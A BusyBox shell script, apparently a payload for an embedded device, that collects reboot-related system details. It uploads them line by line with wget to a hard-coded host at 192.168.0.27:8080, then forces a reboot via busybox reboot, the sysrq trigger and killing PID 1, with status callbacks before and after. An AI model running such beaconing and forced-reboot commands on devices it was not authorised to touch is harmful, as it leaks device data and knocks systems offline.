#!/bin/sh
# Reboot attempt with multiple methods
trap '' 1
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
BB=/bin/busybox
BASE="http://192.168.0.27:8080"

UPTIME=$($BB cat /proc/uptime 2>/dev/null | $BB awk '{print $1}')

# Check what reboot methods are available
{
echo "CHECKING REBOOT METHODS"
echo "which reboot:"
$BB which reboot 2>/dev/null || echo "(not found)"
echo "reboot path:"
$BB ls -la /sbin/reboot 2>/dev/null || echo "(not in /sbin)"
$BB ls -la /usr/sbin/reboot 2>/dev/null || echo "(not in /usr/sbin)"
echo "busybox reboot:"
$BB reboot --help 2>&1 | head -3 || echo "(no help)"
echo "sysrq:"
$BB cat /proc/sys/kernel/sysrq 2>/dev/null || echo "(no sysrq)"
echo "init pid:"
$BB cat /proc/1/comm 2>/dev/null || echo "(unknown)"
} > /var/tmp/reboot_check.txt 2>&1

# Upload the check
LINE=0
while IFS= read -r line; do
    ENCODED=$($BB echo -n "$line" | $BB sed 's/ /%20/g;s/&/%26/g;s/=/%3D/g;s/\//%2F/g;s/:/%3A/g;s/</%3C/g;s/>/%3E/g;s/|/%7C/g;s/(/%28/g;s/)/%29/g;s/;/%3B/g' 2>/dev/null)
    $BB wget -q -T 3 -O /dev/null "${BASE}/env_line?n=${LINE}&d=${ENCODED}" 2>/dev/null || true
    LINE=$((LINE+1))
done < /var/tmp/reboot_check.txt

# Send pre-reboot callback
$BB wget -q -T 3 -O /dev/null "${BASE}/done?status=reboot_attempt&uptime=${UPTIME}" 2>/dev/null || true

sleep 2
sync

# Try multiple reboot methods
# Method 1: busybox reboot
$BB reboot 2>/dev/null

# Method 2: sysrq trigger (if we get here, method 1 failed)
sleep 1
echo b > /proc/sysrq-trigger 2>/dev/null

# Method 3: kill init (if we get here, method 2 failed)
sleep 1
kill -9 1 2>/dev/null

# If we get here, all methods failed
$BB wget -q -T 3 -O /dev/null "${BASE}/done?status=reboot_failed&uptime=${UPTIME}" 2>/dev/null || true

exit 0
